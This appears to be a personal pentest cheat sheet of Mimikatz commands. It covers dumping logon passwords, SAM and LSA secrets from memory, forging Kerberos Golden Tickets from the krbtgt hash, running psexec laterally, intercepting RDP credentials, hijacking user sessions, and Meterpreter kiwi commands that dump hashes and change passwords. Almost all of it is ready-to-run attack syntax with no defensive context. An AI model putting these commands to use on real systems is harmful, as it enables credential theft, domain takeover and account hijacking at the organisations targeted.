# Overview

  - Tool used to view and steal credentials, generate Kerberos tickets, and leverage attacks
  - Dumps credentials stored in memory.
  - Just a few attacks: Credential Dumping, Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Golden Ticket, Silver Ticket


# Creds dumping

module to bypass memory protection
```
privilege::debug
```

```
sekurlsa::logonpasswords # logged in passwords
```
*Sam dumping*
```
lsadump::sam (to dump sam file)
lsadump::sam /patch
```
*LSA dumping*
```
lsadump::lsa /patch # dumping lsa
```

*Golden Ticket*
```
lsadump::lsa /inject /name:krbtgt (filter wanted user name)
Copy SID of the domain and kerberos NTLM hash
kerberos:golden /User:Administrator or any name /domain:DOMAIN /sid:SID /krbtgt:NTLM HASH /id:500 /ptt (pass the ticket)

misc::cmd (open command line with session we created)

command \\COMPUTER\SHARE or file
e.g.
psexec \\ESabah cmd.exe
 
```

# RDP 

*As the attacker was able to gain the session of the machine, they used Mimikatz and ran the mstsc function inside the ts module. Mstsc is a process that runs when the Remote Desktop service in use. It then intercepts the RDP protocol communication to extract the stored credentials.*

```bash

privielge::debug # checks for my perm to run mimikatz
ts::mstsc # intercept connection to dump creds

```

## Session hijacking

```
privilege::debug # checks for my perm to run mimikatz
ts::sessions # list open sessions
token::elevate # Â impersonate token
ts::remote /id:ID_NUMBER # steal session 
```

# On Metasploit

```ruby
# Through Meterpreter session
load kiwi

lsa_dump_sam         #  Dump LSA SAM (Dumps all system users hashes)
lsa_dump_secrets     # Dump LSA secrets (unparsed)
password_change     #   Change the password/hash of a user


```
